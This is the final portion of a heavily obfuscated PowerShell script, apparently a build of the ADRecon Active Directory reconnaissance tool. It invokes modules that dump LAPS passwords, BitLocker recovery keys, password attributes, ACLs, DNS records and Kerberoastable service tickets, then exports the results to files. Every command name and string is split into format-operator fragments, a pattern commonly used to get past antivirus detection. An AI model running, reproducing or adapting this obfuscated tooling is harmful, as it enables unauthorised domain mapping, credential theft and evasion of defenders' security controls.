        &("{4}{0}{3}{2}{1}" -f'em','iable','r','ove-Va','R') ("{0}{1}{2}{4}{3}"-f 'ADR','Pass','word','olicy','P')
    }
    If (${a`dRfiNEgR`Ai`Ne`DPas`sw`oR`dPoli`CY})
    {
        &("{1}{3}{0}{2}" -f'Ou','W','tput','rite-') ("{5}{3}{8}{1}{10}{7}{13}{12}{0}{11}{6}{4}{9}{2}" -f ' a','rained','Account','i','i','[-] F','r',' Poli','ne G','vileged ',' Password',' P','need','cy - May ')
        ${aDRob`JE`ct} = &("{1}{0}{2}{3}{7}{8}{5}{6}{4}" -f 'et','G','-A','DR','wordPolicy','d','Pass','FineGrain','e') -Method ${m`eThOD} -objDomain ${obJdO`M`AIn}
        If (${A`dR`ObJ`eCT})
        {
            &("{0}{3}{2}{1}"-f 'Expor','R','-AD','t') -ADRObj ${a`DRObjE`cT} -ADROutputDir ${ADr`oUtP`Ut`dIR} -OutputType ${outp`U`TtYPE} -ADRModuleName ("{3}{5}{2}{1}{4}{0}" -f'olicy','Passwor','d','Fi','dP','neGraine')
            &("{0}{3}{1}{4}{2}"-f 'Remove-V','r','ble','a','ia') ("{0}{1}" -f'ADRObjec','t')
        }
        &("{0}{1}{2}{3}{4}"-f 'R','e','m','ove','-Variable') ("{8}{4}{3}{7}{0}{5}{2}{6}{1}" -f 'ned','Policy','sw','Gr','RFine','Pas','ord','ai','AD')
    }
    If (${AdrDO`MA`i`NCOn`TROllers})
    {
        &("{1}{0}{2}{3}" -f'te-Out','Wri','p','ut') ("{0}{1}{2}{3}{4}{5}" -f'[-] Do','m','ain',' Cont','rolle','rs')
        ${Ad`RoBje`CT} = &("{3}{4}{1}{5}{2}{0}{6}"-f'e','nCo','troll','Get-AD','RDomai','n','r') -Method ${m`EtHOd} -objDomain ${o`B`jDOm`AIN} -Credential ${cR`edeN`TI`AL}
        If (${A`DRO`BjeCT})
        {
            &("{2}{0}{1}" -f 't-AD','R','Expor') -ADRObj ${a`drobj`ecT} -ADROutputDir ${a`Dr`ouTpU`T`DiR} -OutputType ${O`Utput`TypE} -ADRModuleName ("{4}{2}{0}{1}{3}"-f'Contr','oller','omain','s','D')
            &("{1}{0}{2}"-f 'emove-Variabl','R','e') ("{2}{1}{3}{0}"-f 'ct','DRObj','A','e')
        }
        &("{2}{0}{1}"-f 'e-Vari','able','Remov') ("{1}{5}{0}{4}{2}{3}"-f 'Do','A','troller','s','mainCon','DR')
    }
    If (${AD`R`USerS} -or ${ADrU`SE`RsPns})
    {
        If (!${adrU`SERs`pNS})
        {
            &("{3}{2}{0}{1}" -f'Out','put','ite-','Wr') ("{5}{1}{6}{8}{3}{7}{4}{2}{0}"-f 'e',' Users -','some tim','y','e ','[-]',' ',' tak','Ma')
            ${A`DRuSeRs`pNs} = ${fA`LsE}
        }
        ElseIf (!${Adr`UsE`Rs})
        {
            &("{2}{3}{1}{0}" -f 'Output','e-','Wr','it') ("{0}{1}{2}{3}"-f '[-','] User',' SPN','s')
            ${ADruse`Rs} = ${fa`LSE}
        }
        Else
        {
            &("{0}{2}{1}{3}" -f 'Write','t','-Ou','put') ("{10}{9}{1}{0}{2}{8}{3}{6}{5}{11}{4}{7}" -f ' U',']','s','rs an','ake s','Ns - Ma','d SP','ome time','e','-','[','y t')
        }
        &("{1}{0}{2}"-f 'RU','Get-AD','ser') -Method ${m`eTH`od} -date ${D`AtE} -objDomain ${oBJ`doMa`In} -DormantTimeSpan ${DoRMA`N`TT`iMe`spaN} -PageSize ${P`A`GESiZe} -Threads ${tH`ReAds} -ADRUsers ${a`DRU`S`ERS} -ADRUserSPNs ${Ad`RU`Sersp`NS}
        &("{2}{1}{0}" -f'Variable','ove-','Rem') ("{1}{0}{2}"-f'RUs','AD','ers')
        &("{0}{2}{1}{3}" -f 'Re','abl','move-Vari','e') ("{0}{2}{1}"-f 'ADR','s','UserSPN')
    }
    If (${ad`RPass`Wo`RdAttrIbUtEs})
    {
        &("{2}{0}{1}"-f'-Outp','ut','Write') ("{0}{7}{4}{2}{9}{5}{1}{8}{6}{3}" -f'[-','es ','rib','tal','ordAtt','t','erimen','] Passw','- Exp','u')
        ${Ad`R`ObJEcT} = &("{3}{5}{2}{4}{6}{1}{0}" -f 'utes','rdAttrib','AD','G','RPass','et-','wo') -Method ${me`Thod} -objDomain ${O`B`jdoMAIN} -PageSize ${pA`GeS`IzE}
        If (${AD`R`o`BJeCt})
        {
            &("{1}{3}{0}{2}" -f 'ort-AD','Ex','R','p') -ADRObj ${A`D`RobJECT} -ADROutputDir ${A`DRoU`TPUTdiR} -OutputType ${O`Ut`pUTTYpe} -ADRModuleName ("{4}{1}{2}{0}{3}" -f 'ttribu','ord','A','tes','Passw')
            &("{2}{3}{0}{4}{1}"-f 'Va','able','Re','move-','ri') ("{0}{1}"-f 'AD','RObject')
        }
        &("{2}{3}{0}{4}{1}"-f 'V','iable','Remov','e-','ar') ("{5}{3}{2}{1}{0}{4}" -f'dAtt','r','wo','s','ributes','ADRPas')
    }
    If (${Adr`gRoU`ps} -or ${adRGR`o`UPC`han`gES})
    {
        If (!${ADrGR`O`UPCH`AnGes})
        {
            &("{0}{3}{1}{2}"-f'W','te-Outp','ut','ri') ("{2}{0}{6}{3}{1}{4}{5}" -f 'Groups - M','o','[-] ','take s','me ti','me','ay ')
            ${aDRgrOU`pC`H`ANg`eS} = ${f`A`Lse}
        }
        ElseIf (!${adr`Gr`ou`ps})
        {
            &("{2}{0}{1}{3}" -f'ri','te-','W','Output') ("{3}{1}{11}{10}{9}{13}{14}{6}{0}{4}{2}{5}{7}{8}{12}"-f' - Ma',' ',' t','[-]','y','ake ','nges','s','ome','r','oup Membe','Gr',' time','s','hip Cha')
            ${adRGr`O`UPS} = ${F`AlsE}
        }
        Else
        {
            &("{1}{3}{0}{2}" -f'e-Outpu','Wri','t','t') ("{2}{4}{3}{0}{8}{5}{6}{7}{1}"-f 'mber','me time','[','Groups and Me','-] ','p Chan','ges - May take ','so','shi')
        }
        &("{0}{2}{1}{3}" -f'Get-AD','ou','RGr','p') -Method ${Me`ThOd} -date ${da`Te} -objDomain ${oBjDo`m`AiN} -PageSize ${p`A`gesize} -Threads ${t`h`ReADS} -ADROutputDir ${a`DRoutp`UtDir} -OutputType ${OuT`put`Ty`pE} -ADRGroups ${Ad`Rg`RoUPs} -ADRGroupChanges ${aDrg`Ro`Up`c`HanGEs}
        &("{3}{2}{1}{0}" -f 'iable','Var','ve-','Remo') ("{2}{0}{1}" -f'oup','s','ADRGr')
        &("{3}{1}{0}{2}" -f'V','e-','ariable','Remov') ("{3}{1}{0}{2}" -f 'ou','r','pChanges','ADRG')
    }
    If (${aDrGRoUP`mE`m`BeRs})
    {
        &("{1}{0}{2}"-f 'te-Outpu','Wri','t') ("{1}{6}{4}{0}{5}{2}{10}{7}{3}{8}{9}" -f 'p','[-','ber','ake some t','rou',' Mem','] G','s - May t','im','e','ship')

        ${aD`RoB`jecT} = &("{0}{4}{1}{3}{2}" -f 'Get-','o','ber','upMem','ADRGr') -Method ${mEt`HOD} -objDomain ${o`B`JDOm`AiN} -PageSize ${page`Si`zE} -Threads ${t`H`REadS}
        If (${a`DR`objecT})
        {
            &("{2}{1}{0}" -f'R','xport-AD','E') -ADRObj ${A`d`ROBject} -ADROutputDir ${ADrO`Ut`PU`TDIr} -OutputType ${OUTP`UtTY`pe} -ADRModuleName ("{1}{2}{0}{3}"-f'Memb','Gr','oup','ers')
            &("{1}{3}{2}{0}"-f 'ariable','Rem','ve-V','o') ("{0}{2}{1}"-f 'ADRObj','ct','e')
        }
        &("{0}{2}{3}{1}" -f 'Rem','ble','ove-Vari','a') ("{0}{2}{1}"-f'AD','oupMembers','RGr')
    }
    If (${aD`RO`US})
    {
        &("{2}{1}{0}" -f'utput','ite-O','Wr') (("{7}{6}{1}{2}{3}{5}{4}{0}" -f 'Us)','ani','zati','o','O','nalUnits (','Org','[-] '))
        ${adrOBJ`e`Ct} = &("{1}{0}{2}" -f 'et-A','G','DROU') -Method ${m`ET`Hod} -objDomain ${ObjD`O`mAIN} -PageSize ${P`AGe`SiZE} -Threads ${T`hrE`ADS}
        If (${adR`ObJE`ct})
        {
            &("{2}{0}{1}" -f 'ort','-ADR','Exp') -ADRObj ${AdRob`j`eCt} -ADROutputDir ${ad`R`OUTPuTDir} -OutputType ${OU`TpU`TT`Ype} -ADRModuleName "OUs"
            &("{2}{1}{3}{0}"-f'riable','ove-V','Rem','a') ("{2}{1}{0}" -f't','Objec','ADR')
        }
        &("{0}{3}{2}{1}" -f'Remove-Va','e','abl','ri') ("{1}{0}" -f'DROUs','A')
    }
    If (${Adr`GP`oS})
    {
        &("{0}{2}{1}"-f 'Writ','tput','e-Ou') ("{1}{2}{0}"-f 's','[','-] GPO')
        ${A`dRO`BjecT} = &("{0}{1}{2}"-f'Ge','t-A','DRGPO') -Method ${ME`ThoD} -objDomain ${Ob`J`dOmaiN} -PageSize ${p`AGES`IZe} -Threads ${thr`E`ADS}
        If (${AD`ROB`JEct})
        {
            &("{1}{2}{0}"-f 'DR','Exp','ort-A') -ADRObj ${a`d`Robj`ect} -ADROutputDir ${aDR`ouT`PUTdir} -OutputType ${ouTp`U`TtYPe} -ADRModuleName ("{1}{0}" -f'Os','GP')
            &("{2}{1}{3}{0}" -f 'ble','e-','Remov','Varia') ("{1}{0}{2}" -f'DRO','A','bject')
        }
        &("{0}{3}{1}{2}{4}"-f'Rem','ve-Varia','bl','o','e') ("{2}{0}{1}"-f 'DRGPO','s','A')
    }
    If (${A`dr`gPliN`Ks})
    {
        &("{1}{2}{0}"-f'put','Write','-Out') ("{5}{2}{6}{1}{4}{3}{0}" -f 'nagement (SOM)',' o','-] gPLin','Ma','f ','[','ks - Scope')
        ${a`drOBJ`EcT} = &("{0}{2}{1}{3}"-f 'Get-ADRg','n','PLi','k') -Method ${mE`T`hod} -objDomain ${o`BjDO`MaIN} -PageSize ${P`Age`SIZe} -Threads ${t`h`REAds}
        If (${a`DRoB`jECT})
        {
            &("{0}{2}{1}" -f 'Ex','R','port-AD') -ADRObj ${ADRO`BJE`Ct} -ADROutputDir ${ADRo`U`TPu`TDir} -OutputType ${oUt`pUt`T`YpE} -ADRModuleName ("{1}{2}{0}" -f 'Links','g','P')
            &("{1}{4}{3}{2}{0}"-f 'e','Re','abl','e-Vari','mov') ("{1}{0}" -f'bject','ADRO')
        }
        &("{2}{3}{1}{0}"-f 'e-Variable','mov','R','e') ("{0}{1}{2}" -f'ADRgPLi','nk','s')
    }
    If (${aD`RdnSZ`onEs} -or ${ADrDns`Recor`DS})
    {
        If (!${ad`RDNSrEco`Rds})
        {
            &("{0}{3}{1}{2}" -f 'Wri','ut','put','te-O') ("{0}{2}{3}{1}"-f '[-] D','es','NS',' Zon')
            ${Adrd`N`sREc`O`RDS} = ${F`AL`Se}
        }
        ElseIf (!${aD`Rd`N`SzONeS})
        {
            &("{2}{0}{1}{3}" -f'i','te-','Wr','Output') ("{2}{0}{1}{4}{3}" -f'S ','Re','[-] DN','ds','cor')
            ${adrDnszo`N`eS} = ${f`Alse}
        }
        Else
        {
            &("{2}{0}{1}"-f'ut','put','Write-O') ("{3}{5}{4}{2}{1}{6}{0}"-f'ds',' and Rec','DNS Zones','[-',' ',']','or')
        }
        &("{0}{3}{1}{2}"-f 'Get-ADRD','SZ','one','N') -Method ${m`e`ThOd} -objDomain ${Ob`jDOm`AiN} -DomainController ${DO`maiNC`ontr`oLleR} -Credential ${CRe`Den`TI`Al} -PageSize ${pA`Ge`size} -ADROutputDir ${A`dRoUtp`Ut`dir} -OutputType ${ou`TPU`TTY`PE} -ADRDNSZones ${a`Dr`dnSZONES} -ADRDNSRecords ${aDR`dNs`Re`cOR`ds}
        &("{2}{1}{0}{3}" -f'Variabl','move-','Re','e') ("{0}{3}{2}{1}" -f'A','ones','DNSZ','DR')
    }
    If (${aD`Rp`Ri`NterS})
    {
        &("{1}{0}{2}{3}" -f '-O','Write','ut','put') ("{0}{2}{3}{1}"-f'[-] P','s','rint','er')
        ${a`DRob`Ject} = &("{2}{0}{1}{3}"-f 't-ADRP','rin','Ge','ter') -Method ${M`E`Thod} -objDomain ${ob`JDoMa`In} -PageSize ${p`A`G`ESizE} -Threads ${T`hREads}
        If (${A`DR`OBje`ct})
        {
            &("{2}{0}{1}"-f 't-A','DR','Expor') -ADRObj ${adr`O`B`JEct} -ADROutputDir ${Ad`RoU`T`PutdiR} -OutputType ${OU`T`PUTT`Ype} -ADRModuleName ("{0}{1}{2}"-f 'Prin','te','rs')
            &("{2}{1}{3}{0}"-f'able','move-','Re','Vari') ("{1}{0}"-f't','ADRObjec')
        }
        &("{1}{2}{3}{0}"-f 'e','Remo','ve-Va','riabl') ("{2}{1}{0}{3}"-f'inter','DRPr','A','s')
    }
    If (${aDr`co`M`PUteRs} -or ${a`dr`com`pUtE`RspNs})
    {
        If (!${a`dRCO`mput`er`sp`NS})
        {
            &("{0}{2}{1}" -f 'Write-','tput','Ou') ("{6}{4}{3}{2}{0}{5}{1}" -f'ke so','e time','ay ta',' Computers - M',']','m','[-')
            ${adRCo`mpuT`ERSP`Ns} = ${f`A`lsE}
        }
        ElseIf (!${A`DR`cO`MPuTerS})
        {
            &("{0}{3}{2}{1}"-f 'Wr','t','tpu','ite-Ou') ("{2}{1}{0}{3}{4}{5}" -f']','-','[',' Comput','er SP','Ns')
            ${A`DR`CoMP`U`TeRS} = ${f`AlsE}
        }
        Else
        {
            &("{2}{3}{0}{1}"-f 'te','-Output','W','ri') ("{2}{1}{4}{0}{3}{6}{7}{5}"-f' SP','] Computer','[-','Ns - Ma','s and',' time','y ta','ke some')
        }
        &("{3}{1}{0}{2}"-f 'C','R','omputer','Get-AD') -Method ${m`eTHoD} -date ${d`Ate} -objDomain ${Ob`jd`omAiN} -DormantTimeSpan ${d`orma`N`T`TIMESPAn} -PassMaxAge ${pASS`ma`Xa`ge} -PageSize ${pA`ge`si`ZE} -Threads ${tHrEa`dS} -ADRComputers ${a`Dr`cOm`pUtErs} -ADRComputerSPNs ${Ad`R`ComPut`ERS`pNS}
        &("{0}{3}{2}{1}{4}" -f 'Re','r','a','move-V','iable') ("{3}{0}{2}{1}"-f 'R','omputers','C','AD')
        &("{3}{1}{2}{0}"-f'riable','mo','ve-Va','Re') ("{1}{2}{0}{3}"-f'PN','ADRCo','mputerS','s')
    }
    If (${A`d`RLApS})
    {
        &("{1}{0}{2}"-f'p','Write-Out','ut') ("{4}{7}{5}{8}{0}{9}{1}{6}{10}{3}{2}" -f 'ged','Ac','t','un','[-] L','ds ','c','APS - Nee','Privile',' ','o')
        ${AdrO`BJ`e`Ct} = &("{2}{0}{3}{1}{4}" -f 'et-ADRLAP','hec','G','SC','k') -Method ${m`ET`Hod} -objDomain ${o`BjDom`A`in} -PageSize ${Pa`Ge`S`Ize} -Threads ${ThR`Ea`DS}
        If (${A`DRobJE`cT})
        {
            &("{0}{2}{1}" -f 'E','ort-ADR','xp') -ADRObj ${AD`RobJE`ct} -ADROutputDir ${adr`OuTpu`TDir} -OutputType ${Ou`TP`U`Ttype} -ADRModuleName ("{0}{1}"-f'L','APS')
            &("{1}{4}{0}{2}{3}"-f'ri','Remove','abl','e','-Va') ("{2}{3}{1}{0}" -f 'ect','RObj','A','D')
        }
        &("{2}{1}{4}{3}{0}" -f'ble','mo','Re','ia','ve-Var') ("{1}{2}{0}" -f 'S','ADRL','AP')
    }
    If (${aDr`Bi`TlOC`k`eR})
    {
        &("{0}{1}{2}" -f'Writ','e-Outpu','t') ("{4}{3}{0}{10}{6}{11}{1}{2}{9}{8}{5}{7}" -f'Bit','er Recover','y ',' ','[-]','il','c','eged Account','iv','Keys - Needs Pr','Lo','k')
        ${A`Dro`BJE`Ct} = &("{0}{2}{1}{3}" -f'Ge','-ADRBitLoc','t','ker') -Method ${M`Eth`OD} -objDomain ${Ob`JD`oMaiN} -DomainController ${D`OmAiNCO`Nt`RO`Ll`Er} -Credential ${c`ReDEN`TIAL}
        If (${ADr`OBje`ct})
        {
            &("{1}{3}{2}{0}" -f 'R','Expor','D','t-A') -ADRObj ${aDR`oB`jEct} -ADROutputDir ${Adrou`TPuT`dIr} -OutputType ${ou`TP`U`TTYPE} -ADRModuleName ("{1}{4}{2}{3}{0}" -f's','BitL','eryKe','y','ockerRecov')
            &("{0}{2}{4}{1}{3}"-f'R','-Var','emo','iable','ve') ("{0}{1}" -f 'A','DRObject')
        }
        &("{1}{2}{0}"-f'e','Remove-Va','riabl') ("{1}{0}{2}"-f'Lock','ADRBit','er')
    }
    If (${AD`RaC`Ls})
    {
        &("{3}{0}{2}{1}" -f 'rit','utput','e-O','W') ("{6}{3}{1}{2}{4}{0}{5}"-f' some ti','] ACLs - Ma','y tak','-','e','me','[')
        ${a`DROBJ`e`ct} = &("{1}{2}{0}" -f 'L','Get-ADR','AC') -Method ${m`ET`HoD} -objDomain ${objd`O`MAIn} -DomainController ${D`omAI`NcO`NT`R`olLER} -Credential ${cREd`en`TiAl} -PageSize ${paG`EsI`Ze} -Threads ${t`hR`eADS}
        &("{2}{0}{1}"-f 'aria','ble','Remove-V') ("{2}{1}{0}" -f 'CLs','RA','AD')
    }
    If (${a`dR`gP`oReP`OrT})
    {
        &("{2}{0}{1}{3}" -f'ite','-Outpu','Wr','t') ("{4}{2}{0}{1}{3}{5}{6}" -f ' ','May take','-] GPOReport -',' some','[',' ','time')
        &("{2}{1}{3}{4}{0}" -f't','t-ADRGPORe','Ge','po','r') -Method ${M`EthOd} -UseAltCreds ${u`sEAl`TCR`edS} -ADROutputDir ${aDROut`P`UtD`ir}
        &("{1}{2}{0}{4}{3}" -f 'e-','R','emov','e','Variabl') ("{2}{0}{1}{3}"-f 'PO','Rep','ADRG','ort')
    }
    If (${A`DR`KeRB`eRo`ASt})
    {
        &("{0}{2}{1}"-f'Write-','ut','Outp') ("{3}{1}{0}{2}"-f'rbe',' Ke','roast','[-]')
        ${AD`Ro`BJeCt} = &("{0}{2}{3}{1}{4}{5}"-f 'Ge','Kerbe','t-','ADR','roas','t') -Method ${met`hoD} -objDomain ${Obj`D`o`maIn} -Credential ${cr`edEN`TIAL} -PageSize ${p`AgE`sIZe}
        If (${aDRO`BJ`ECT})
        {
            &("{1}{0}{3}{2}" -f'r','Expo','-ADR','t') -ADRObj ${adR`O`BJ`ECt} -ADROutputDir ${aD`ROU`TPuTDIr} -OutputType ${OutP`Ut`TypE} -ADRModuleName ("{2}{3}{1}{0}" -f'st','eroa','K','erb')
            &("{3}{1}{0}{2}" -f 'ove-Vari','m','able','Re') ("{1}{0}" -f 'ect','ADRObj')
        }
        &("{4}{0}{1}{3}{2}"-f'move-Var','i','ble','a','Re') ("{3}{0}{2}{1}{4}"-f 'e','as','rbero','ADRK','t')
    }
    If (${AdRD`o`MAINaCC`oUNt`Su`s`ED`For`S`ervICeLOg`ON})
    {
        &("{2}{3}{1}{0}"-f 'e-Output','it','W','r') ("{11}{4}{6}{12}{16}{7}{17}{0}{15}{3}{14}{9}{1}{8}{10}{2}{13}{5}" -f 'Se','ogon - Need','ged Acc','i','Domain ','nt','A','use','s Privil','e L','e','[-] ','ccount','ou','c','rv','s ','d for ')
        ${A`D`ROBJ`eCT} = &("{12}{0}{9}{2}{7}{4}{8}{6}{5}{11}{3}{10}{1}"-f'e','on','ADRDo','ServiceL','ai','us','unts','m','nAcco','t-','og','edfor','G') -Method ${mETh`od} -objDomain ${OBjdO`M`AIN} -Credential ${C`ReD`Ent`iAL} -PageSize ${pAg`e`S`iZE} -Threads ${tH`REadS}
        If (${AdRO`BJe`Ct})
        {
            &("{1}{2}{0}"-f'rt-ADR','Exp','o') -ADRObj ${Adro`Bj`ECT} -ADROutputDir ${a`DR`oUTpuTD`IR} -OutputType ${O`U`TPuTTy`pE} -ADRModuleName ("{7}{6}{1}{3}{4}{0}{5}{2}"-f'rServic','t','n','suse','dfo','eLogo','Accoun','Domain')
            &("{1}{0}{2}"-f 'emove-Variab','R','le') ("{1}{0}{2}"-f'bj','ADRO','ect')
        }
        &("{1}{3}{2}{0}" -f 'riable','Remo','e-Va','v') ("{6}{7}{3}{1}{5}{4}{0}{2}" -f 'dforSe','nts','rviceLogon','omainAccou','se','u','A','DRD')
    }

    ${To`TAlt`ImE} = "{0:N2}" -f ((&("{2}{3}{1}{0}" -f'f','-DateDif','G','et') -Date1 (&("{0}{1}{2}" -f 'Ge','t','-Date')) -Date2 ${D`ATe})."toT`ALmI`Nu`TeS")

    ${AbOUTAd`RE`c`on} = &("{2}{1}{0}" -f 'RAbout','-AD','Get') -Method ${m`eTh`OD} -date ${da`TE} -ADReconVersion ${AD`R`EcONv`ersIon} -Credential ${CR`eDEnTI`Al} -RanonComputer ${R`AN`On`COMp`UtEr} -TotalTime ${TOtal`T`Ime}

    If ( (${Out`P`UT`TYpE} -Contains "CSV") -or (${ouT`P`UTtype} -Contains "XML") -or (${ou`TP`UtTYPe} -Contains ("{0}{1}"-f 'JS','ON')) -or (${oU`TpU`Tty`Pe} -Contains ("{0}{1}"-f 'HT','ML')) )
    {
        If (${ab`o`Ut`ADREcON})
        {
            &("{3}{0}{2}{1}"-f 'x','R','port-AD','E') -ADRObj ${ab`o`UT`ADrE`cOn} -ADROutputDir ${a`DrOuTP`UtDir} -OutputType ${o`UTP`UtTY`pe} -ADRModuleName ("{2}{1}{0}" -f 'n','DReco','AboutA')
        }
        &("{0}{3}{1}{2}"-f'W','ut','put','rite-O') "[*] Total Execution Time (mins): $($TotalTime) "
        &("{1}{2}{3}{0}" -f't','Write-O','u','tpu') ('['+'*] '+'Out'+'put '+'Dire'+'c'+'t'+'ory: '+"$ADROutputDir")
        ${adr`sT`Do`Ut} = ${fa`l`sE}
    }

    Switch (${o`UtPUTt`y`pE})
    {
        ("{0}{1}"-f 'STD','OUT')
        {
            If (${A`dRstd`OUt})
            {
                &("{0}{1}{2}" -f 'Write-','Outp','ut') "[*] Total Execution Time (mins): $($TotalTime) "
            }
        }
        ("{1}{0}"-f 'TML','H')
        {
            &("{0}{2}{1}" -f'Export','DR','-A') -ADRObj $(&("{3}{0}{2}{1}"-f '-O','ect','bj','New') ("{0}{1}{2}" -f 'P','S','Object')) -ADROutputDir ${a`dr`oUTpU`T`Dir} -OutputType $([array] ("{0}{1}" -f'HTM','L')) -ADRModuleName ("{1}{0}" -f'x','Inde')
        }
        ("{0}{1}"-f 'EXC','EL')
        {
            &("{3}{1}{2}{0}"-f'el','port-ADRE','xc','Ex') ${a`DRoUTpUT`DIR}
        }
    }
    &("{0}{2}{3}{4}{1}" -f'R','le','em','o','ve-Variab') ("{1}{0}{2}"-f 'otalT','T','ime')
    &("{3}{0}{1}{2}"-f'emove-Vari','ab','le','R') ("{3}{1}{2}{0}"-f 'on','outA','DRec','Ab')
    &("{1}{0}{2}" -f'-Locati','Set','on') ${R`et`Ur`NdiR}
    &("{0}{1}{3}{2}" -f 'Remove','-','le','Variab') ("{2}{0}{1}" -f'etur','ndir','r')

    If ((${mETH`oD} -eq ("{1}{0}"-f'DWS','A')) -and ${US`EAL`TCrEdS})
    {
        &("{3}{1}{2}{0}" -f 'e','emove-PSDr','iv','R') ("{0}{1}"-f 'A','DR')
    }

    If (${MeT`H`Od} -eq ("{1}{0}"-f 'P','LDA'))
    {
        ${ObJdo`mA`In}.("{1}{0}" -f 'ose','Disp').Invoke()
        ${ob`jd`OMa`InrOoTdSe}.("{2}{0}{1}"-f'is','pose','D').Invoke()
    }

    If (${a`dr`OuTPutDir})
    {
        &("{6}{0}{1}{5}{4}{2}{3}"-f'ove','-E','ROutput','Dir','tyAD','mp','Rem') ${ADR`ou`TPUt`dir} ${ou`Tputty`pe}
    }

    &("{0}{2}{1}"-f'Remove-V','ble','aria') ("{2}{3}{1}{0}" -f'on','rsi','ADR','econVe')
    &("{0}{3}{2}{1}" -f'Rem','e','ve-Variabl','o') ("{2}{3}{0}{1}" -f'p','uter','R','anonCom')
}

If (${L`og})
{
    &("{2}{0}{3}{1}{4}{5}" -f 'rt-Tr','nscri','Sta','a','p','t') -Path "$(Get-Location)\ADRecon-Console-Log.txt"
}

&("{4}{1}{0}{2}{3}" -f '-AD','ke','R','econ','Invo') -GenExcel ${Ge`NEXC`el} -Method ${m`Ethod} -Collect ${cO`LLecT} -DomainController ${domAiNcO`NT`Rol`LeR} -Credential ${C`REDe`NtiAl} -OutputType ${O`UTp`Ut`TypE} -ADROutputDir ${o`UtP`UTD`IR} -DormantTimeSpan ${D`ormANTti`M`ESp`AN} -PassMaxAge ${pa`s`S`mAxAge} -PageSize ${p`AGeSIze} -Threads ${th`REa`DS}

If (${l`OG})
{
    &("{2}{3}{4}{1}{0}"-f't','nscrip','S','top-Tr','a')
}

